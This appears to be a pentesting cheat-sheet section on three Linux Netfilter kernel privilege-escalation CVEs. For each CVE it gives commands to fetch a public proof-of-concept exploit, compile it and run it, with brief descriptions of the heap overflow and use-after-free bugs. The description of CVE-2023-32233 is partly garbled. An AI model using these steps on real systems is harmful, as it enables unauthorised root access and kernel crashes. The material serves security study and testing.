
`Netfilter` is a Linux kernel module that provides, packet filtering, network address translation, and other tools relevant to firewalls.

## CVE-2021-22555

```sh
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c

gcc -m32 -static exploit.c -o exploit 
```

---
## CVE-2022-25636

This is `net/netfilter/nf_dup_netdev.c`, which can grant root privileges to local users due to heap out-of-bounds write. `Nick Gregory` wrote a very detailed [article](https://nickgregory.me/post/2022/03/12/cve-2022-25636/) about how he discovered this vulnerability.

However, we need to be careful with this exploit as it can corrupt the kernel, and a reboot will be required to reaccess the server.

```sh
make
./exploit
````

---
## CVE-2023-32233

The exploitation is done by manipulating the system to use the `cleared out` `anonymous sets` in `nf_tables` by using the `Use-After-Free` vulnerability to interact with the kernel's memory.

```sh
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
```

These `nf_tables` are temporary workspaces for processing batch requests and once the processing is done, these anonymous sets are supposed to be cleared out (`Use-After-Free`) so they cannot be used anymore. 

---